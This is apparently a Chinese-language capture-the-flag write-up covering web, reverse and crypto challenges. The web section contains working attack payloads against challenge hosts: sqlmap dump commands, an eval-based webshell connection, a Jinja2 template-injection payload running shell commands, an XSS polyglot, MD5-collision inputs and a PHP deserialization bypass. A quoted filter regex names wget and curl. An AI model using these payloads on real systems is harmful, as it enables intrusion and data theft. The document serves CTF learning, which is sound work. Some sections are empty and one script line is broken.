# web

## 欢迎来到Web安全

查看源码搜索 swpu 得到flag

## easy_sql

```shell
sqlmap -u "http://175.24.172.136:30083/?wllm=1" -D test_db -T test_tb -C fllaag --dump

sqlmap -u "http://175.24.172.136:30071/?wllm=1" -D test_peng -T test_2tb -C ffflllaaaggg --dump # 错误
```

## happy_rce

```php
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $ip)){
      die('换个方法吧？被过滤啦！');
  }
  eval($ip);
}
?> 
```

蚁剑连接 `http://175.24.172.136:30023/jiangnaij.php?url=eval($_POST[%27hack%27]);` ，密码为hack，文件管理在根目录下找到 flag

## happy_php

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$a=0.58;
if (!preg_match('/[^0-9]/',$_GET['jiangnaij'])){
    if ((int)(substr(md5($_GET['jiangnaij']),0,6)) === 666666) {
        if (isset($_POST['pysnow']) and isset($_POST['M1sery']))
        {
            if ($_POST['pysnow'] != $_POST['M1sery'])
            {
                if (md5($_POST['pysnow']) == md5($_POST['M1sery'])){
                    if (isset($_POST['s0rry']) and isset($_POST['DSTBP']))
                    {
                        if ((string)$_POST['s0rry'] != (string)$_POST['DSTBP'])
                        {
                            if (md5($_POST['s0rry']) === md5($_POST['DSTBP'])) 
                            {
                                if ($_GET['csc8'] == intval($a * 100)){
                                    include '/flag.php';
                                    echo $flag;
                                }
                                else echo "csc8说你错了";
                            }
                            else echo 's0rry和DSTBP说你错了';
                        }
                        else echo "请输入不同的s0rry，DSTBP";
                    }
                    else echo "s0rry和DSTBP说快来玩";
                }
                else echo 'pysnow和M1sery说你错了';
            }
            else echo "请输入不同的pysnow，M1sery";
        }
        else echo "pysnow和M1sery说快来玩";
    }
    else echo "相等吗？？？";
}
else echo "输入一个数，这个数md5加密后前六位全是6！";
相等吗？？？
```

用下面的脚本爆破得到md5加密后前六位全是6的数：

```python
# -*- coding: utf-8 -*-
import multiprocessing
import hashlib
import random
import string
import sys
CHARS = string.digits

def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds.encode('utf-8'))
        if md5.hexdigest()[start: start+str_len] == substr:
            print(rnds)
            stop_event.set()


substr = sys.argv[1].strip()
start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0
str_len = len(substr)
cpus = multiprocessing.cpu_count()
stop_event = multiprocessing.Event()
processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                        stop_event, str_len, start_pos))
                for i in range(cpus)]
for p in processes:
    p.start()
for p in processes:
    p.join()

'''
python ch_md5.py "666666" 0  # 命令行运行，得到如下结果 
61146528383226743337

?jiangnaij=61146528383226743337&csc8=57

'''
```

`(string)$_POST['s0rry'] != (string)$_POST['DSTBP']` 部分为md5碰撞。先用 hackbar 发送原来的请求，BP抓包，发到 Repeater ，再粘贴一次POST的值即可，多测试几次（做法来自https://www.bilibili.com/video/BV1514y1s7od/?spm_id_from=333.337.search-card.all.click&vd_source=f7d99068aaef12987e4f91ab71f0546a&t=395.9，误打误撞搞出来了，但是原理很简单）

```shell
GET http://175.24.172.136:30070/?jiangnaij=61146528383226743337&csc8=57

POST pysnow[]=NKCDZO&M1sery[]=40610708&s0rry=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&DSTBP=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

## can you faster

flask 2.2.2 py3 多半是模板注入 gunicorn20.0.4请求走私

## ez_upload

## easy_java

## easy_flask

ssti注入漏洞，payload如下

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("cat flag").read()') }} # ls 查看得到当前为 / 目录且flag文件在此处
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

## easy_xss

hackbar 的 payload

`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("flag") )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("flag")//>\x3e`

## baby_ssrf

源码泄露：

`POST  url=http://sudo.cc/flag.php  -> swpu{werefgou-`

## do_not_wakeup

序列化得 `O:1:"A":1:{s:19:"Aare_you_a_hacker";s:9:"yesyesyes";}` ，修改绕过wakeup得 O:1:"A":1:{s:19:"Aare_you_a_hacker";s:9:"yesyesyes";} ，URL编码后payload如下： `data=O%3A1%3A%22A%22%3A5%3A%7Bs%3A19%3A%22%00A%00are_you_a_hacker%22%3Bs%3A9%3A%22yesyesyes%22%3B%7D`

```php
<?php
class A
{
    private $are_you_a_hacker='yesyesyes';
}
$a=new A();
echo(urlencode(serialize($a)));
?>
```

## sql2

# misc

## all in base

baseX Python爆破求解

# reverse

## 一道简单的签到

记事本打开搜索 swpu 得到flag：`swpu{youfindthesecret!!}`

## xor

## SUPX

## 64base

```python
import base64
a = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/'
b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
c = '2T3M3xJr3wqT4tfeuenTq9mNwBvOsdzJ1hQ='
table = str.maketrans(a,b)
d = c.translate(table)
data = base64.b64decode(d)
print(data)
```

`swpu{Qud7y1DPCwB31ZUrH6ml}`

## swpu_easy_android

反编译得到 check 类，在 idea 中运行测试得到密码为 `f53720bd5d9f07a8dc1028df48b8e1bb` ，登录进下一个界面。

## pyc大挑战

`uncompyle6 -o rc4.py rc4.pyc` 反编译得到源码

```python
def init(key):
    sBox = []
    index = 0
    k = []
    for i in range(256):
        sBox.append(i)
        k.append(ord(key[(i % len(key))]))
    for i in range(256):
        index = (index + sBox[i] + k[i]) % 256
        sBox[i], sBox[index] = sBox[index], sBox[i]
    return sBox


def rc4_crypt(data, sBox):
    i = 0
    j = 0
    t = 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + sBox[i]) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
        t = (sBox[i] + sBox[j]) % 256
        data[k] ^= sBox[t]
    return data


def data_to_str(data):
    str = ''
    for i in range(len(data)):
        str += chr(data[i])
    return str


def str_to_data(str):
    d = []
    for i in range(len(str)):
        d.append(ord(str[i]))
    return d


data = [ 115, 119, 112, 117, 123, 114, 99, 52, 95, 49, 115, 95, 101, 52, 115, 121, 125]
flag = input('请输入flag：')
key = 'wllm'
sBox = init(key)
flag = str_to_data(flag)
res = rc4_crypt(flag, sBox)
if flag == res:
    print('yes')
else:
    print('wrong')
```

# crypto

## 善哉善哉

# All in Base

python跑了下，有如下字符串，猜测为 base64 变式，构造的支付与下面一致，研究对应算法

```python
['0', '1', '2', '3', '4', '5', '=', 'A', 'D', 'E', 'G', 'I', 'M', 'N', 'O', 'Q', 'R', 'T', 'U', 'V', 'W', 'Y', 'Z', 'c', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'x', 'y', 'z']
```

## AES

网站 [AES在线加密解密工具 - MKLab在线工具](https://www.mklab.cn/utils/aes) 解密，选项设置为 nopadding 128位。

## 爆破MD5

```python
#coding: utf-8
import hashlib
dic = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-'
dic0=dic.to
for a in dic:
    for b in dic:
        for c in dic:
            for d in dic:
                # flag = 'Boom_MD5' + str(a) + str(b) + + str(c) + + str(d)
                flag = 'Boom_MD5'+a+b+c+d
                md5 = hashlib.md5(flag.encode('utf-8')).hexdigest()
                if md5[:27] == "0618ac93d4631df725bceea74d0":
                    print(flag)
print("over")
# data = 'Boom_MD5****'
# Boom_MD5_NSS
# 0618ac93d4631df725bceea74d0*****
# 0618ac93d4631df725bceea74d0fe071

```

## Welcome to Modern Cryptography

直接用 [在线RSA私钥加密解密、RSA private key encryption and decryption--查错网 (chacuo.net)](http://tool.chacuo.net/cryptrsaprikey) 解密
